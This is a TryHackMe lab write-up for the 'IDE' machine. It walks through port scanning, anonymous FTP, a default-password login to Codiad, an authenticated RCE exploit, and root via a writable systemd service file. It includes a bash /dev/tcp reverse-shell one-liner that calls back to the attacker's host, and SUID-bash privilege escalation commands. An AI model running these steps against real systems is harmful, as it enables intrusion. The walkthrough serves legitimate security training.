# TryHackMe - IDE (Write-Up)

_5 min read · May 17, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough for [**IDE**](https://tryhackme.com/room/ide) machine from [**TryHackMe**](https://tryhackme.com/).

- Goal: Obtain User and Root Flag
- Difficulty: Easy
- Machine Author: bluestorm and 403Exploit

---

## Scanning for Open Ports

Machine IP: 10.49.146.58.

As usual, I started with an [**Nmap**](https://www.kali.org/tools/nmap/) scan:

```bash
nmap -T4 -p- 10.49.146.58
sudo nmap -sCV -p 21,22,80,62337 10.49.146.58 -oN nmap.txt
```

![Nmap Output](./img/thm-ide/Nmap-output.png)

From the scan result, I noticed that:

- FTP (port 21) is open and anonymous login is allowed.
- SSH (port 22) is open.
- HTTP (port 80) is open.
- HTTP (port 62337) is open.

As usual, I checked the site first on port 80. However, it was just the default Apache2 Ubuntu page.

---

## Futher Enumeration on the Website

I then browsed the site on port 62337 and found a login page.

![IDE: Website](./img/thm-ide/web.png)

I tried default credentials such as `admin:admin`, but they didn't work.

I noticed that the CMS being used is Codiad version 2.8.4.

I then searched for an exploit and found [Codiad 2.8.4 - Remote Code Execution (Authenticated)](https://www.exploit-db.com/exploits/49705).

I saved it into my current working directory:

```bash
searchsploit 49705 -m
```

I tried to use it but it required a username and password, which I didn't have yet.

Then I used [**Gobuster**](https://www.kali.org/tools/gobuster/) to enumerate directories.

```bash
gobuster dir -u http://10.49.146.58:62337 -w /usr/share/wordlists/dirb/big.txt -t 100
```

![Gobuster Output](./img/thm-ide/gobuster-output.png)

Unfortunately, I didn't find anything interesting.

---

## FTP Enumeration

I then accessed FTP.

```bash
ftp 10.49.165.118
anonymous
password
```

Inside, I found a file named `-`. I then downloaded it.

```bash
get -
```

Inside the file, I found this message:

```output
Hey john,
I have reset the password as you have asked. Please use the default password to login.
Also, please take care of the image file ;)
- drac.
```

From here I can see that there are two users, which are John and Drac.

It also mentions that John is using the default password, which immediately made me think of trying common credentials.

So I went back to the site and successfully logged in as `john:password`.

---

## Exploitation

Inside the site:

![IDE: Website Inside](./img/thm-ide/web-in.png)

There's nothing much here I think.

Since I now had valid credentials, I decided to use the previous exploit to gain shell access.

1st terminal:

```bash
python3 49705.py http://10.48.133.217:62337/ john password 192.168.223.226 4418 linux
```

2nd terminal:

```bash
echo 'bash -c "bash -i >/dev/tcp/192.168.223.226/4419 0>&1 2>&1"' | nc -lnvp 4418
```

3rd terminal:

```bash
nc -lnvp 4419
```

I successfully received a reverse shell as `www-data`.

---

## Post-Exploitation

Inside the system, I navigated to `/home/drac` directory to retrieve the user flag. However, I didn't have permission to do so.

So I started enumerating files that might contain sensitive information.

Inside `.bash_history`:

```output
mysql -u drac -p 'Th3dRaCULa1sR3aL'
```

I tried to switch to drac using this credential and it worked.

I then retrieved the **user flag**.

![User Flag](./img/thm-ide/user-flag.png)

---

## Privilege Escalation

I checked for allowed `sudo` for drac:

```bash
sudo -l
```

```output
User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

This means drac is allowed to restart the `vsftpd` service as root.

I tried to run it and noticed that it uses the `vsftpd.service` file.

![vsftpd restart](./img/thm-ide/vsftpd.png)

I then tried to locate the file:

```bash
find / -name vsftpd.service -xdev 2>/dev/null
```

```output
/lib/systemd/system/vsftpd.service
```

Then I checked its permission.

```output
-rw-rw-r-- 1 root drac 248 Aug  4  2021 /lib/systemd/system/vsftpd.service
```

So the file is writable by the `drac` group.

I logged in again through SSH and modified the file by adding:

```bash
ExecStart=/bin/chmod +s /bin/bash
```

- `/bin/chmod +s /bin/bash` → Set the SUID bit on `/bin/bash`.

After modifying the service file, I reloaded systemd:

```bash
systemctl daemon-reload
```

Then I restarted the service:

```bash
sudo /usr/sbin/service vsftpd restart
```

Finally, I spawned a root shell:

```bash
/bin/bash -p
```

I successfully became root.

I then navigated to `/root` and retrieved the **root flag**.

![Root Flag](./img/thm-ide/root-flag.png)

Bomba! Settleee.

---

## Session Terminated

From this machine, I learned how to:

- exploit authenticated RCE vulnerabilities in Codiad CMS
- abuse writable systemd service files for root privilege escalation
- leverage SUID binaries to gain root shell

Thank you for reading and see you next time!
